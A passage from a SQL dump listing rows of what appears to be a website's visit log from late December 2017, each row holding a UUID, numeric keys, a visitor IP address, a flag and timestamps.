14:06:52',NULL),(57,'c33af334-cfec-466d-b9fd-6882f4697c3a',NULL,5,22,'194.187.170.127',NULL,NULL,NULL,1,'2017-12-27 15:37:07','2017-12-27 15:37:07',NULL),(58,'fc353be6-9e46-4643-b3bb-6cf35b1f39c3',NULL,5,18,'40.77.167.34',NULL,NULL,NULL,1,'2017-12-27 16:14:00','2017-12-27 16:14:00',NULL),(59,'a7c1a823-8820-42ea-8c54-e0a86dba83dc',NULL,5,22,'194.187.170.119',NULL,NULL,NULL,1,'2017-12-27 19:51:16','2017-12-27 19:51:16',NULL),(60,'8aace763-425a-48e5-9388-51ed26e91f10',NULL,5,22,'194.187.170.119',NULL,NULL,NULL,1,'2017-12-27 19:52:41','2017-12-27 19:52:41',NULL),(61,'d38dea5e-d6ee-4fd5-818d-3eb100a49620',NULL,5,22,'194.187.170.119',NULL,NULL,NULL,1,'2017-12-27 20:12:35','2017-12-27 20:12:35',NULL),(62,'907b3041-f1de-454d-9eee-0139e97df54f',NULL,5,22,'194.187.170.119',NULL,NULL,NULL,1,'2017-12-27 20:14:56','2017-12-27 20:14:56',NULL),(63,'f950dc3a-0f21-4c8a-8eb3-186b3d1941be',NULL,6,9,'115.132.92.94',NULL,NULL,NULL,0,'2017-12-27 20:54:44','2017-12-27 20:54:44',NULL),(64,'13a9b325-f7fd-41e4-a398-47630ebcc6ff',NULL,5,23,'34.207.98.73',NULL,NULL,NULL,1,'2017-12-27 21:28:45','2017-12-27 21:28:45',NULL),(65,'30fb1ea8-7bb8-443c-84d0-bc14555c938b',NULL,5,22,'194.187.170.119',NULL,NULL,NULL,1,'2017-12-27 21:33:19','2017-12-27 21:33:19',NULL),(66,'2cb820ab-4e2f-49fb-ba8f-1432216350d2',NULL,5,3,'37.187.75.71',NULL,NULL,NULL,1,'2017-12-27 23:16:18','2017-12-27 23:16:18',NULL),(67,'44b134ac-373c-489a-8ad5-051234810cb5',NULL,5,3,'37.187.75.71',NULL,NULL,NULL,1,'2017-12-27 23:16:21','2017-12-27 23:16:21',NULL),(68,'16b3de56-17c8-41e4-9689-ba75b5e3fe9e',NULL,5,3,'37.187.75.71',NULL,NULL,NULL,1,'2017-12-27 23:16:27','2017-12-27 23:16:27',NULL),(69,'b120e70a-11fa-498b-be2a-96bbcb81e36c',NULL,5,4,'66.249.75.216',NULL,NULL,NULL,1,'2017-12-27 23:40:24','2017-12-27 23:40:24',NULL),(70,'ed9280d6-4761-449e-a6dc-ec7314aa2160',NULL,5,22,'194.187.170.116',NULL,NULL,NULL,1,'2017-12-28 01:43:44','2017-12-28 01:43:44',NULL),(71,'ba69455e-3fd9-4f2b-a170-9a0fbbab8e06',NULL,5,4,'66.249.75.10',NULL,NULL,NULL,1,'2017-12-28 03:12:02','2017-12-28 03:12:02',NULL),(72,'5cce1d19-4255-43c2-ac2a-eca5c4854c81',NULL,5,4,'66.249.75.8',NULL,NULL,NULL,1,'2017-12-28 03:19:31','2017-12-28 03:19:31',NULL),(73,'e8bb323c-a8ad-4ecb-b88e-1f0a5000165f',NULL,5,24,'31.184.135.122',12,NULL,NULL,1,'2017-12-28 03:49:46','2017-12-28 03:49:46',NULL),(74,'acf65b88-279f-4686-bd7c-72c42041e7c7',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:20','2017-12-28 04:32:20',NULL),(75,'c8e1a544-1195-4b1e-ab64-c0227880e54e',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:23','2017-12-28 04:32:23',NULL),(76,'d740248d-1911-4265-861f-bfa94707befc',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:27','2017-12-28 04:32:27',NULL),(77,'7fbe4d60-ea8b-4768-838f-30b460ac5e25',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:30','2017-12-28 04:32:30',NULL),(78,'3cbffbf1-2daa-4411-a586-5dc0c8b854be',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:36','2017-12-28 04:32:36',NULL),(79,'116309d9-5192-4350-a4b5-d39a7cee01ed',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:40','2017-12-28 04:32:40',NULL),(80,'187d6c0d-41c6-42ab-ad47-a0b02e6708d1',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:43','2017-12-28 04:32:43',NULL),(81,'a7b0f154-f748-415a-83e5-330646826039',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:49','2017-12-28 04:32:49',NULL),(82,'5be42f36-690b-42bd-b758-b6a390db6cad',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:53','2017-12-28 04:32:53',NULL),(83,'a564a098-5cf8-467d-be36-91fe7479b531',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:32:56','2017-12-28 04:32:56',NULL),(84,'c9b132a7-9c73-4afa-ae40-6ad302f1a346',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:33:00','2017-12-28 04:33:00',NULL),(85,'f5232f65-a18c-4139-ace5-596d65747ada',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:33:04','2017-12-28 04:33:04',NULL),(86,'ccadb5aa-a460-464c-a3d3-6051b45a900c',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:33:07','2017-12-28 04:33:07',NULL),(87,'43e90dba-3588-4cfa-bc98-ac1ed57bc0ac',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-28 04:33:11','2017-12-28 04:33:11',NULL),(88,'4b078019-7cb6-437f-b7b5-bbbe13aeb65c',NULL,6,9,'86.110.232.100',NULL,NULL,NULL,0,'2017-12-28 06:52:50','2017-12-28 06:52:50',NULL),(89,'d40079a5-9671-48ea-924f-baba0ee9dd9c',NULL,10,14,'89.234.68.78',17,NULL,NULL,0,'2017-12-28 07:03:46','2017-12-28 07:03:46',NULL),(90,'2f5b14fd-ac13-48db-b720-7dce478c79cc',NULL,10,14,'89.234.68.78',17,NULL,NULL,0,'2017-12-28 07:03:55','2017-12-28 07:03:55',NULL),(91,'aff0787b-9dd4-43f9-aab4-65f6727c6165',NULL,10,14,'89.234.68.78',17,NULL,NULL,0,'2017-12-28 07:04:14','2017-12-28 07:04:14',NULL),(92,'1b089ef8-a878-4c62-809d-921cd0c91cb8',NULL,10,14,'89.234.68.78',17,NULL,NULL,0,'2017-12-28 07:04:25','2017-12-28 07:04:25',NULL),(93,'02bd6619-8c5c-44d0-975c-e9dfb26c662e',NULL,10,14,'89.234.68.78',17,NULL,NULL,0,'2017-12-28 07:04:40','2017-12-28 07:04:40',NULL),(94,'17c79a97-a413-4d38-bc30-5dea242e6122',NULL,10,14,'89.234.68.78',17,NULL,NULL,0,'2017-12-28 07:04:52','2017-12-28 07:04:52',NULL),(95,'05faba4a-adb2-4395-8d77-84488a31d183',NULL,9,26,'180.153.236.101',11,NULL,NULL,1,'2017-12-28 07:45:49','2017-12-28 07:45:49',NULL),(96,'5f297253-9c8c-48d5-b0f7-af65c08f4e2f',NULL,5,3,'199.58.86.211',NULL,NULL,NULL,1,'2017-12-28 09:55:26','2017-12-28 09:55:26',NULL),(97,'d30a20d9-5611-4745-9bc4-1503c9b94e4e',NULL,11,28,'31.56.146.165',14,NULL,NULL,0,'2017-12-28 10:30:53','2017-12-28 10:30:53',NULL),(98,'b72a3f1a-9412-438d-9b4e-37d53a278dba',NULL,5,22,'194.187.170.147',NULL,NULL,NULL,1,'2017-12-28 11:07:25','2017-12-28 11:07:25',NULL),(99,'cde34bbe-8a6f-474f-9285-27265114a86f',NULL,5,22,'194.187.170.147',NULL,NULL,NULL,1,'2017-12-28 11:18:34','2017-12-28 11:18:34',NULL),(100,'c952e1f5-932e-4563-a3fa-cf030d1a3c7f',NULL,5,3,'144.76.19.144',NULL,NULL,NULL,1,'2017-12-28 11:29:50','2017-12-28 11:29:50',NULL),(101,'ea7bf256-460c-46ec-8e00-c2eb12a002d8',NULL,5,3,'144.76.19.144',NULL,NULL,NULL,1,'2017-12-28 11:29:52','2017-12-28 11:29:52',NULL),(102,'7a8708dd-d91c-4b12-99fe-91064fa3bec8',NULL,5,3,'144.76.19.144',NULL,NULL,NULL,1,'2017-12-28 11:29:56','2017-12-28 11:29:56',NULL),(103,'719d52d7-a572-4bc4-a931-e9c38624c13e',NULL,5,22,'194.187.170.147',NULL,NULL,NULL,1,'2017-12-28 12:15:12','2017-12-28 12:15:12',NULL),(104,'4ba7d8e6-4442-4d78-afca-7725cbc86e18',NULL,13,29,'13.56.229.65',NULL,NULL,NULL,0,'2017-12-28 13:03:57','2017-12-28 13:03:57',NULL),(105,'47cac955-0d92-4655-8bfc-3f838e5168c5',NULL,5,22,'194.187.170.130',NULL,NULL,NULL,1,'2017-12-28 17:01:15','2017-12-28 17:01:15',NULL),(106,'9cbf1103-9958-4821-9847-fc23a1b4e29c',NULL,5,22,'194.187.170.130',NULL,NULL,NULL,1,'2017-12-28 17:17:14','2017-12-28 17:17:14',NULL),(107,'177d339d-6237-4495-b428-686e31095e99',NULL,5,30,'208.83.1.168',NULL,NULL,NULL,1,'2017-12-28 17:35:18','2017-12-28 17:35:18',NULL),(108,'58869e48-d346-4988-8fb2-0bf3ef555e21',NULL,11,31,'51.254.208.48',NULL,NULL,NULL,0,'2017-12-28 18:35:19','2017-12-28 18:35:19',NULL),(109,'4083ac57-b579-48c1-986b-5f46d2461bc1',NULL,14,32,'58.20.108.148',NULL,NULL,NULL,0,'2017-12-28 22:49:48','2017-12-28 19:19:48',NULL),(110,'eca89b38-fdd7-49d0-a3c3-0d0dddde5bc1',NULL,15,33,'40.77.167.120',NULL,NULL,NULL,1,'2017-12-28 19:51:46','2017-12-28 19:51:46',NULL),(111,'327a8358-230c-4244-a9e0-b710c369c65d',NULL,5,17,'141.8.132.7',NULL,NULL,NULL,1,'2017-12-28 21:06:30','2017-12-28 21:06:30',NULL),(112,'f0fe00d9-7656-4dfd-b63d-3afdbf2639c0',NULL,5,17,'37.9.113.184',NULL,NULL,NULL,1,'2017-12-28 21:06:46','2017-12-28 21:06:46',NULL),(113,'0777f19a-15fb-478e-bd4e-f4a3b1c38082',NULL,6,9,'95.40.93.166',NULL,NULL,NULL,0,'2017-12-28 22:26:32','2017-12-28 22:26:32',NULL),(114,'32b04155-3b2a-49d6-8ccc-60bb4fb9824c',NULL,16,34,'70.184.195.196',NULL,NULL,NULL,0,'2017-12-29 00:12:49','2017-12-29 00:12:49',NULL),(115,'18da674f-95fa-4957-a7f6-f6a9e2dd700c',NULL,15,35,'199.30.25.253',NULL,NULL,NULL,1,'2017-12-29 02:12:06','2017-12-29 02:12:06',NULL),(116,'7e6443e0-d4c5-491d-b08c-696e0e6bb80e',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2017-12-29 04:23:02','2017-12-29 04:23:02',NULL),(117,'46094b4a-f1f8-4b72-b4fa-7ed0d8d3c2b6',NULL,7,36,'180.153.236.11',12,NULL,NULL,0,'2017-12-29 04:31:41','2017-12-29 04:31:41',NULL),(118,'07041324-b505-4ff0-b467-dcc6dea2b663',NULL,17,37,'66.249.75.6',NULL,NULL,NULL,1,'2017-12-29 05:45:01','2017-12-29 05:45:01',NULL),(119,'93900cc4-0b79-4f2a-83ee-8e40ff360384',NULL,12,19,'66.249.93.88',NULL,NULL,NULL,1,'2017-12-29 08:12:40','2017-12-29 08:12:40',NULL),(120,'c6549f27-812c-4d0f-bda1-eb04c771de9d',NULL,11,15,'151.241.104.122',NULL,NULL,NULL,0,'2017-12-29 09:31:13','2017-12-29 09:31:13',NULL),(121,'4b05666b-9a34-4e38-9397-b53a39aae164',NULL,11,15,'151.241.104.122',12,NULL,NULL,0,'2017-12-29 13:01:19','2017-12-29 09:31:19',NULL),(122,'0f2d7bae-5edf-45da-9eb0-5dd86563e504',NULL,5,3,'162.210.196.129',NULL,NULL,NULL,1,'2017-12-29 10:10:09','2017-12-29 10:10:09',NULL),(123,'dce70b3a-819a-4c53-8015-b3c1afd46400',NULL,5,38,'13.210.186.38',NULL,NULL,NULL,0,'2017-12-29 10:55:38','2017-12-29 10:55:38',NULL),(124,'a22acebe-34aa-4b13-867c-1ace0deb0da4',NULL,5,3,'173.208.200.154',NULL,NULL,NULL,1,'2017-12-29 12:07:10','2017-12-29 12:07:10',NULL),(125,'53a9c859-1dcd-4250-9c14-ded835daf211',NULL,11,39,'146.185.223.123',11,NULL,NULL,0,'2017-12-29 12:08:47','2017-12-29 12:08:47',NULL),(126,'9151f1f8-b867-439c-be17-266d8d8ec8ff',NULL,5,3,'173.208.200.154',NULL,NULL,NULL,1,'2017-12-29 12:09:18','2017-12-29 12:09:18',NULL),(127,'3c0fb555-52fa-4c62-940b-69819ba5b4ac',NULL,5,3,'173.208.200.154',NULL,NULL,NULL,1,'2017-12-29 12:14:55','2017-12-29 12:14:55',NULL),(128,'38d24fd0-a173-4dff-8941-66e09043f810',NULL,5,3,'173.208.200.154',NULL,NULL,NULL,1,'2017-12-29 12:16:45','2017-12-29 12:16:45',NULL),(129,'7ddc8e5b-5b95-4d30-a18e-49d1821dc14b',NULL,5,3,'173.208.200.154',NULL,NULL,NULL,1,'2017-12-29 12:18:14','2017-12-29 12:18:14',NULL),(130,'80b4ff17-ff09-499a-bdf8-b0ebc17dd321',NULL,5,3,'173.208.200.154',NULL,NULL,NULL,1,'2017-12-29 12:20:06','2017-12-29 12:20:06',NULL),(131,'650e95e9-7841-4aae-9383-572ee41a667a',NULL,11,40,'77.77.81.255',14,NULL,NULL,0,'2017-12-29 12:25:28','2017-12-29 12:25:28',NULL),(132,'7c3c490d-0e35-4c4a-abbb-55c8d31143e3',NULL,5,22,'194.187.170.123',NULL,NULL,NULL,1,'2017-12-29 12:51:08','2017-12-29 12:51:08',NULL),(133,'10ff5fed-705e-4926-8455-3302aa1db455',NULL,5,22,'194.187.170.123',NULL,NULL,NULL,1,'2017-12-29 12:51:38','2017-12-29 12:51:38',NULL),(134,'7ce0a3af-0b0a-40ca-8928-90545f29f09c',NULL,9,11,'42.236.54.42',11,NULL,NULL,1,'2017-12-29 13:09:38','2017-12-29 13:09:38',NULL),(135,'7ff26a35-f98f-4f70-a19d-83f5f23def96',NULL,11,41,'180.169.191.142',NULL,NULL,NULL,0,'2017-12-29 13:09:43','2017-12-29 13:09:43',NULL),(136,'504be090-2ebe-41ae-9216-e3bf103c97bd',NULL,9,11,'42.236.99.230',12,NULL,NULL,1,'2017-12-29 13:11:47','2017-12-29 13:11:47',NULL),(137,'10461de9-23d3-404b-88d2-6241f4fcfbb9',NULL,18,42,'146.185.223.132',11,NULL,NULL,0,'2017-12-29 13:26:51','2017-12-29 13:26:51',NULL),(138,'14230865-350e-4da4-8a34-fee7605f6e28',NULL,5,22,'194.187.170.123',NULL,NULL,NULL,1,'2017-12-29 13:41:51','2017-12-29 13:41:51',NULL),(139,'136e9550-d2d0-4366-9e31-5676c67edb95',NULL,6,43,'37.27.34.69',14,NULL,NULL,0,'2017-12-29 13:50:00','2017-12-29 13:50:00',NULL),(140,'8c0699dd-fb14-465e-8cf2-32ad91a7f245',NULL,11,40,'77.77.81.255',14,NULL,NULL,0,'2017-12-29 14:50:00','2017-12-29 14:50:00',NULL),(141,'a016a610-ed77-4ac3-b696-567983e6ebc5',NULL,11,15,'209.126.90.116',22,NULL,NULL,0,'2017-12-29 15:30:11','2017-12-29 15:30:11',NULL),(142,'dc2c826d-f84b-44f4-94f4-67610f6950d0',NULL,5,3,'144.76.38.73',NULL,NULL,NULL,1,'2017-12-29 15:47:24','2017-12-29 15:47:24',NULL),(143,'9661bd5a-1f7c-4fbb-ba46-390901cdbe6b',NULL,5,3,'144.76.38.73',NULL,NULL,NULL,1,'2017-12-29 15:47:27','2017-12-29 15:47:27',NULL),(144,'a6ec44c1-c982-4242-9900-a52ac7bf3fdd',NULL,5,3,'144.76.38.73',NULL,NULL,NULL,1,'2017-12-29 15:47:29','2017-12-29 15:47:29',NULL),(145,'074f2904-b5f6-4b11-9f28-38913095c99d',NULL,5,44,'74.115.214.156',23,NULL,NULL,1,'2017-12-29 17:25:07','2017-12-29 17:25:07',NULL),(146,'c9d2ba76-59b6-4b11-8d84-232de75fd6cf',NULL,11,45,'217.60.74.234',16,NULL,NULL,0,'2017-12-29 21:35:54','2017-12-29 18:05:54',NULL),(147,'149914a5-a338-4274-a76d-a63e6a06f71f',NULL,5,46,'216.244.66.226',NULL,NULL,NULL,1,'2017-12-29 18:41:52','2017-12-29 18:41:52',NULL),(148,'c19e9f7a-73cb-42c6-b23d-79dfe792ddf6',NULL,5,4,'66.249.75.8',NULL,NULL,NULL,1,'2017-12-29 20:08:59','2017-12-29 20:08:59',NULL),(149,'9c5a2040-8c74-456e-aa83-531602ef807c',NULL,5,47,'195.146.37.19',NULL,NULL,NULL,1,'2017-12-29 20:30:33','2017-12-29 20:30:33',NULL),(150,'60f72bcb-3c1e-41d8-bfb8-39cd88e41804',NULL,9,11,'42.236.10.77',11,NULL,NULL,1,'2017-12-29 21:14:28','2017-12-29 21:14:28',NULL),(151,'a490d41f-9c97-447c-bc07-014b8f27952d',NULL,9,12,'42.236.10.100',12,NULL,NULL,1,'2017-12-29 21:14:29','2017-12-29 21:14:29',NULL),(152,'95565df9-414a-4e10-b989-bd00a7ea8b01',NULL,5,47,'195.146.37.19',NULL,NULL,NULL,1,'2017-12-29 21:19:31','2017-12-29 21:19:31',NULL),(153,'42a0522d-06ac-42e4-8dbc-7b74f7e80b79',NULL,5,4,'66.249.75.8',NULL,NULL,NULL,1,'2017-12-29 23:31:13','2017-12-29 23:31:13',NULL),(154,'0691a5f8-f936-49e3-b050-795f592dcd71',NULL,5,2,'91.121.86.136',NULL,NULL,NULL,1,'2017-12-29 23:33:56','2017-12-29 23:33:56',NULL),(155,'f04cbdd3-3d85-4504-8952-9ca3ede6fa16',NULL,5,2,'91.121.86.136',NULL,NULL,NULL,1,'2017-12-29 23:34:04','2017-12-29 23:34:04',NULL),(156,'50ab5f7f-1db1-4910-9b48-8ceb597ba97b',NULL,5,2,'91.121.86.136',NULL,NULL,NULL,1,'2017-12-29 23:34:27','2017-12-29 23:34:27',NULL),(157,'b3c88550-9147-4b6a-9c28-eaf43efe2afa',NULL,6,9,'23.112.20.98',NULL,NULL,NULL,0,'2017-12-30 01:31:23','2017-12-30 01:31:23',NULL),(158,'2dfadabd-4d11-4fc1-80b5-a8f071878bfa',NULL,5,44,'74.115.214.147',24,NULL,NULL,1,'2017-12-30 02:13:14','2017-12-30 02:13:14',NULL),(159,'36188fc4-d391-47ab-a230-bc69cc3a208d',NULL,5,21,'36.110.147.74',NULL,NULL,NULL,1,'2017-12-30 03:37:57','2017-12-30 03:37:57',NULL),(160,'4d84c5b6-be35-4830-b11b-79af0cbde11b',NULL,19,48,'175.145.107.18',NULL,NULL,NULL,0,'2017-12-30 04:26:19','2017-12-30 04:26:19',NULL),(161,'83c81ebe-be06-4371-bbc8-3a41a2b8f08c',NULL,5,46,'216.244.66.197',NULL,NULL,NULL,1,'2017-12-30 04:31:19','2017-12-30 04:31:19',NULL),(162,'ee7b1595-635b-49bc-9490-c0402ebe1c6f',NULL,5,47,'195.146.37.19',NULL,NULL,NULL,1,'2017-12-30 04:37:51','2017-12-30 04:37:51',NULL),(163,'cd09d4a7-d5ad-4894-ada9-473e8ac7d75e',NULL,9,26,'180.153.236.189',12,NULL,NULL,1,'2017-12-30 06:15:35','2017-12-30 06:15:35',NULL),(164,'d628a93f-53c4-41fd-8202-4c408b86f474',NULL,9,26,'180.153.236.189',11,NULL,NULL,1,'2017-12-30 06:15:35','2017-12-30 06:15:35',NULL),(165,'27921a6f-f828-4eae-94f5-d9cf81f191b2',NULL,5,49,'66.249.75.10',NULL,NULL,NULL,1,'2017-12-30 07:00:04','2017-12-30 07:00:04',NULL),(166,'cdbd6819-1312-4f42-9311-1d7773dd9b59',NULL,12,19,'66.249.93.90',NULL,NULL,NULL,1,'2017-12-30 08:00:19','2017-12-30 08:00:19',NULL),(167,'64589a63-1325-4037-99a1-14bf517c57b6',NULL,5,44,'142.234.115.154',24,NULL,NULL,1,'2017-12-30 08:09:57','2017-12-30 08:09:57',NULL),(168,'3cbe9938-659b-44c3-927c-6e452268c1da',NULL,1,1,'31.47.32.230',25,NULL,NULL,0,'2017-12-30 12:02:40','2017-12-30 08:32:40',NULL),(169,'7c906f58-3d7c-4c98-b98b-53b598763e0e',NULL,5,24,'31.184.135.122',11,NULL,NULL,1,'2017-12-30 08:58:51','2017-12-30 08:58:51',NULL),(170,'b947e207-f559-413c-b076-248c2f03d8c1',NULL,5,24,'31.184.133.100',12,NULL,NULL,1,'2017-12-30 09:15:28','2017-12-30 09:15:28',NULL),(171,'e8ad58c2-9b61-4346-836f-371e0b1eb3c2',NULL,1,1,'31.47.32.230',27,NULL,NULL,0,'2017-12-30 13:15:52','2017-12-30 09:45:52',NULL),(172,'5404bcea-831e-4e27-9b3f-782954d8e17e',NULL,5,3,'144.76.8.134',NULL,NULL,NULL,1,'2017-12-30 10:11:57','2017-12-30 10:11:57',NULL),(173,'0e24178a-4997-4c5c-b982-bc7ce8cf0a51',NULL,5,47,'195.146.37.19',NULL,NULL,NULL,1,'2017-12-30 11:09:17','2017-12-30 11:09:17',NULL),(174,'0e020ca6-0798-4ee0-937f-c54d71b324a2',NULL,20,50,'5.112.150.4',NULL,NULL,NULL,0,'2017-12-30 15:45:41','2017-12-30 15:45:41',NULL),(175,'4c1b6d8b-8bdf-4d51-af4d-0d4e5c053ce8',NULL,6,9,'77.79.18.110',NULL,NULL,NULL,0,'2017-12-30 16:39:04','2017-12-30 16:39:04',NULL),(176,'9621d550-e635-4d95-97fe-6de538c69189',NULL,5,3,'162.210.196.129',NULL,NULL,NULL,1,'2017-12-30 16:59:57','2017-12-30 16:59:57',NULL),(177,'3f58a2ce-6a38-4b6d-ae3c-b4a45b90d0f1',NULL,21,51,'158.46.163.87',NULL,NULL,NULL,0,'2017-12-30 20:54:57','2017-12-30 20:54:57',NULL),(178,'81c03c3d-7c11-4352-b994-3091dabd4a64',NULL,5,21,'220.181.125.188',NULL,NULL,NULL,1,'2017-12-31 00:16:37','2017-12-31 00:16:37',NULL),(179,'fd97ecbc-1858-4a36-8ced-873d37be19e9',NULL,22,52,'196.61.28.115',NULL,NULL,NULL,0,'2017-12-31 00:51:21','2017-12-31 00:51:21',NULL),(180,'7bbca712-4e09-4e7b-8a19-f021254013b4',NULL,5,44,'142.234.115.155',28,NULL,NULL,1,'2017-12-31 01:59:03','2017-12-31 01:59:03',NULL),(181,'5373b17a-cd43-423a-acae-760969d02ec4',NULL,5,53,'34.241.134.121',NULL,NULL,NULL,1,'2017-12-31 02:45:03','2017-12-31 02:45:03',NULL),(182,'c4519870-2c82-4ed0-9c0f-740a61cc3eb4',NULL,5,44,'74.115.214.130',23,NULL,NULL,1,'2017-12-31 02:53:22','2017-12-31 02:53:22',NULL),(183,'2963b1f6-fe3e-4fe0-bdf7-ebfabe62bdd7',NULL,5,44,'74.115.214.157',NULL,NULL,NULL,1,'2017-12-31 02:53:24','2017-12-31 02:53:24',NULL),(184,'1cf1f4e2-1753-489c-98db-e27ec29b224d',NULL,5,3,'5.9.89.170',NULL,NULL,NULL,1,'2017-12-31 05:16:39','2017-12-31 05:16:39',NULL),(185,'59718bf9-c408-45a8-8f26-f7b871e95c15',NULL,5,3,'5.9.89.170',NULL,NULL,NULL,1,'2017-12-31 05:16:42','2017-12-31 05:16:42',NULL),(186,'87055a54-dd61-42ea-b6b8-7b4019d4f198',NULL,5,3,'5.9.89.170',NULL,NULL,NULL,1,'2017-12-31 05:16:46','2017-12-31 05:16:46',NULL),(187,'134682ae-60a9-4aaf-a653-643b29524f31',NULL,5,3,'199.58.86.211',NULL,NULL,NULL,1,'2017-12-31 06:00:17','2017-12-31 06:00:17',NULL),(188,'f60ea316-3fe2-4889-b2e6-0a15ff11a08b',NULL,5,54,'149.154.167.170',NULL,NULL,NULL,1,'2017-12-31 06:09:32','2017-12-31 06:09:32',NULL),(189,'f4705707-c211-4c9c-baaa-904e5e59b43f',NULL,5,17,'141.8.142.7',NULL,NULL,NULL,1,'2017-12-31 06:36:07','2017-12-31 06:36:07',NULL),(190,'3809582c-278d-4893-9f0d-f2a33ab76b84',NULL,13,29,'13.56.229.65',NULL,NULL,NULL,0,'2017-12-31 06:53:47','2017-12-31 06:53:47',NULL),(191,'49698721-50af-4082-a929-7d36d604bc05',NULL,20,50,'5.112.95.160',NULL,NULL,NULL,0,'2017-12-31 07:19:23','2017-12-31 07:19:23',NULL),(192,'dd2c2c56-616a-4733-92ea-4b746561d998',NULL,5,2,'194.247.173.126',NULL,NULL,NULL,1,'2017-12-31 07:47:01','2017-12-31 07:47:01',NULL),(193,'53c61feb-37fe-4762-80f5-e0ff4d52e412',NULL,5,2,'194.247.173.126',NULL,NULL,NULL,1,'2017-12-31 07:47:05','2017-12-31 07:47:05',NULL),(194,'06d35591-5e89-4dea-8db9-4f913d03ea5e',NULL,5,2,'194.247.173.126',NULL,NULL,NULL,1,'2017-12-31 07:47:30','2017-12-31 07:47:30',NULL),(195,'2db84fe0-4d9a-4ea8-8352-8ae3c31888b4',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:57:27','2017-12-31 07:57:27',NULL),(196,'ea77c627-dafc-4956-87c8-cd684958d8b8',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:57:30','2017-12-31 07:57:30',NULL),(197,'cbdb3e1c-04aa-40f3-9679-e3bb74a3f018',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:57:34','2017-12-31 07:57:34',NULL),(198,'7e6e5a88-bcbc-4290-910c-d8e5a5990520',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:57:37','2017-12-31 07:57:37',NULL),(199,'ed532fb7-36a4-4ea6-8f2f-65caa2c8e6c1',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:57:43','2017-12-31 07:57:43',NULL),(200,'ebf84d51-8792-4cf1-b64d-bd3378a01e5a',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:57:47','2017-12-31 07:57:47',NULL),(201,'2542e218-f0cc-4684-b488-239f823c97b1',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:57:50','2017-12-31 07:57:50',NULL),(202,'4728e710-d652-4a81-b346-052a8f756795',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:57:56','2017-12-31 07:57:56',NULL),(203,'36d40591-9bd7-4400-b32d-a964e9b88d2a',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:58:00','2017-12-31 07:58:00',NULL),(204,'9f0575a0-fd3c-44fb-bcec-764765b5cecc',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:58:03','2017-12-31 07:58:03',NULL),(205,'f64041d2-6b17-49c7-87a1-6a2dc784144c',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:58:07','2017-12-31 07:58:07',NULL),(206,'de727c86-5b46-4dcb-8310-f4df174a6bd8',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:58:10','2017-12-31 07:58:10',NULL),(207,'5f67ee3f-0889-4e23-8280-cb11240a934b',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:58:14','2017-12-31 07:58:14',NULL),(208,'c3a83cc0-a43f-4be5-b8b9-ae83ec470332',NULL,5,25,'23.237.4.26',NULL,NULL,NULL,1,'2017-12-31 07:58:17','2017-12-31 07:58:17',NULL),(209,'6fc0bb77-6a7a-43ad-a1be-674dbaae657a',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:21:39','2017-12-31 08:21:39',NULL),(210,'f5855d23-dfee-4f82-9387-31c5ee28bfdb',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:21:46','2017-12-31 08:21:46',NULL),(211,'00096e3a-c1b6-49b3-8bab-7c93948dda92',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:21:49','2017-12-31 08:21:49',NULL),(212,'bde0e5dc-49cc-40ca-838d-20d4af586e6f',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:21:52','2017-12-31 08:21:52',NULL),(213,'7256b8dc-f296-45a4-8979-ee67d8142abd',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:21:57','2017-12-31 08:21:57',NULL),(214,'a734c1a3-f1a0-4901-a731-35d926085bad',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:00','2017-12-31 08:22:00',NULL),(215,'e3fbdf65-86c4-4f4b-9e00-0976481e7d90',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:03','2017-12-31 08:22:03',NULL),(216,'830e2e0d-be66-451c-927b-3c181d99d573',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:06','2017-12-31 08:22:06',NULL),(217,'7ed7937a-3817-483d-9a81-98d32d01d79b',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 08:22:09','2017-12-31 08:22:09',NULL),(218,'22f620bb-7e28-4ecb-8d4c-504cae6690bd',NULL,11,55,'192.99.67.14',NULL,NULL,NULL,0,'2017-12-31 